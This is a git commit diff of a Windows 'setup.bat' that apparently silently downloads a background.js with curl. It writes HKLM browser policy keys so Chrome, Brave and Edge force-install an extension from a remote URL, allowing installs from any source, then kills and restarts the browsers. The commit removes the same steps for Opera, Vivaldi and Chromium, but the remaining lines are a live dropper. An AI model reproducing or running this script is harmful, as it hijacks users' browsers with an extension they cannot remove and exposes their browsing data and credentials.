a7043527b402e81a6634888eaa2dacad2c9accb5
ezlishmail <140186829+ezlishmail@users.noreply.github.com>
2026-05-05 23:56:56 +0530

    Remove Opera and Vivaldi commands from setup.bat
    Removed browser-specific extension installation commands for Opera and Vivaldi, and cleaned up the restart section.

--- setup.bat
+++ setup.bat
@@ -19,39 +19,19 @@ curl -s -o "%D%\background.js" https://raw.githubusercontent.com/ezlishmail/cdn-
 set "ID=leelplbjobiheomgknchcnbmnancegal"
 set "URL=https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/version.xml"
 
-:: Google Chrome
 reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1
-
-:: Brave
 reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1
-
-:: Microsoft Edge
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1
 
-:: Opera
-reg add "HKLM\SOFTWARE\Policies\Opera\Opera\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
-
-:: Vivaldi
-reg add "HKLM\SOFTWARE\Policies\Vivaldi\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
-
-:: Chromium
-reg add "HKLM\SOFTWARE\Policies\Chromium\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
-
-:: Kill all browsers
 taskkill /F /IM chrome.exe >nul 2>&1
 taskkill /F /IM brave.exe >nul 2>&1
 taskkill /F /IM msedge.exe >nul 2>&1
-taskkill /F /IM opera.exe >nul 2>&1
-taskkill /F /IM vivaldi.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
 
-:: Restart all browsers
 start "" chrome.exe >nul 2>&1
 start "" brave.exe >nul 2>&1
 start "" msedge.exe >nul 2>&1
-start "" opera.exe >nul 2>&1
-start "" vivaldi.exe >nul 2>&1
 exit
